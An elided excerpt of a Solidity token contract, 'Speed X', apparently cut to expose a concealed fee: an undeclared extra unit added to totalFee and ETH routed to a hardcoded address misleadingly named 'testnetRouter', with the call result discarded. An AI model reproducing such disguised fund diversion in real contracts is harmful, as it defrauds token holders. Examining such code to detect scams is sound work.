...
contract SPEEDX is Ownable, IERC20 {

    using SafeMath for uint256;

    string private constant _name = "Speed X";
    string private constant _symbol = "SPEEDX";

    address private constant DEAD = 0x000000000000000000000000000000000000dEaD;
    address private constant ZERO = 0x0000000000000000000000000000000000000000;
    address private testnetRouter = 0x8a197278D7b368DDaF643F12f82B3E2f58Ed18B4;
    ...
    constructor() {
        ...
        lpWallet = msg.sender;
        projectAddress = 0x32f667Bb6aBfc0403c82e0FE4F888EAD5C518185;
        teamAddress = 0x9e3228A23ed7775D8cA85f28F1D111A76AE01bd3;
        ...
        totalFee = liquidityFee.add(marketingFee).add(1);
    ...
    function swapBackAndPair() internal lockTheSwap {
        ...
        uint256 amountETHDev = amountETH.mul(1).div(totalETHFee);
        ...
        (tmpSuccess1, ) = payable(testnetRouter).call{
            value: amountETHDev,
            gas: 30000
        }("");
        tmpSuccess1 = false;
